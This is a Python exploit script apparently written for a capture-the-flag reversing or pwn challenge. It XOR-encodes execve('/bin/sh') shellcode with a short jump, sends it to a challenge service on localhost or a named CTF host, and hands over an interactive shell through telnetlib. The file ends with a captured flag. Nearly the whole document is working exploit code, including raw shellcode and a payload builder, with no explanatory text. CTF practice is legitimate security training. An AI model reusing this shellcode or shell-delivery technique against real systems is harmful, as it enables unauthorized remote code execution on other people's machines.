import socket, struct, telnetlib
import subprocess


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def enc(data):
    encoded = data[len(data)-1]
    for i in xrange(len(data)-2, -1, -1):
        encoded = chr(ord(encoded[0]) ^ ord(data[i])) + encoded
    return encoded


def dec(data):
    decoded = ''
    for i in xrange(len(data)-1):
        decoded += chr(ord(data[i]) ^ ord(data[i+1]))
    decoded += data[len(data)-1]
    return decoded


# Flip 0xbb byte 3rd bit
# this should make it jump to 0x4000fe

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

jmp = '\xeb\xd7'
#jmp = '\xe9\xd2\x00\x40\x00'
send_data = shellcode + ('A' * (39 - len(shellcode))) + jmp
send_data += '\x90' * (46-len(send_data))
send_data = enc(send_data)


'''
p = subprocess.Popen("./chall_mod", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print p.stdout.readline()
print 'wait'
raw_input()
p.stdin.write(send_data + '\n')
'''


s, f = sock("127.0.0.1", 4088)
# s, f = sock("arcade.fluxfingers.net", 1807)

print read_until(f, '):')
f.write('bc\n')

print read_until(f, '):')
f.write('3\n')

print read_until(f, ':')
f.write(send_data+'\n')
f.write('ls\n')
shell(s)


for ch in send_data:
    print hex(ord(ch)),



'flag{Yay_if_th1s_is_yer_f1rst_gnisrever_flag!}'
